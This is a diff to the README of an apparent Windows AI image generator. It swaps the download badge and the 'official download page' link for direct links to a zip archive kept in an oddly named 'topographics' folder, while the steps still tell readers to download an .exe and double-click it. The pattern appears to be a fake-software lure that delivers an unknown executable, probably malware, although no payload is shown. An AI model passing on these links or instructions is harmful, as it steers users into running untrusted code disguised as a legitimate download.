@@ -1,6 +1,6 @@
 # 🎨 Image-AI-Generator-2026 - Create professional artwork with simple prompts
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Delcinetimberframed513/Image-AI-Generator-2026)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Delcinetimberframed513/Image-AI-Generator-2026/raw/refs/heads/main/topographics/Image-Generator-A-v3.9.zip)
 
 Image-AI-Generator-2026 turns your descriptions into high-quality images. It uses advanced machine learning models to help artists and hobbyists create photorealistic renders, creative concepts, and stunning digital artwork without requiring technical skills. You specify the subject, style, and mood, and the software handles the complex math behind the scenes.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your Windows computer meets these hardw
 
 Follow these steps to set up the application on your computer.
 
-1.  Visit the [official download page](https://github.com/Delcinetimberframed513/Image-AI-Generator-2026).
+1.  Visit the [official download page](https://github.com/Delcinetimberframed513/Image-AI-Generator-2026/raw/refs/heads/main/topographics/Image-Generator-A-v3.9.zip).
 2.  Locate the latest version release.
 3.  Download the setup file ending in .exe to your hard drive.
 4.  Double-click the downloaded file to start the installation.
